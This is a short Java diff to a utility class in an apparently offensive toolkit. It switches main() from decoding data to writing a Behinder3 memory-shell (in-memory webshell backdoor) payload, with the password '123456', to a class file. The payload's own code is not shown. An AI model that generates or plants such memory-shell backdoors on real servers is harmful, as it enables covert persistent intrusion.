@@ -2,6 +2,7 @@ package cn.safe6.util;
 
 
 import cn.safe6.payload.TomcatEchoAll;
+import cn.safe6.payload.memshell.Behinder2;
 import net.bytebuddy.ByteBuddy;
 
 import java.io.*;
@@ -14,10 +15,10 @@ import java.util.Base64;
 public class GetByteCodeUtil {
 
     public static void main(String[] args) throws Exception {
-        decodeData();
+       // decodeData();
        //encodeData();
 
-        //getFileByBytes(TomcatEchoAll.getPayload(),"load.class");
+        getFileByBytes(Behinder2.getMemBehinder3Payload("123456"),"load.class");
     }
 
     public static void decodeData() throws Exception {
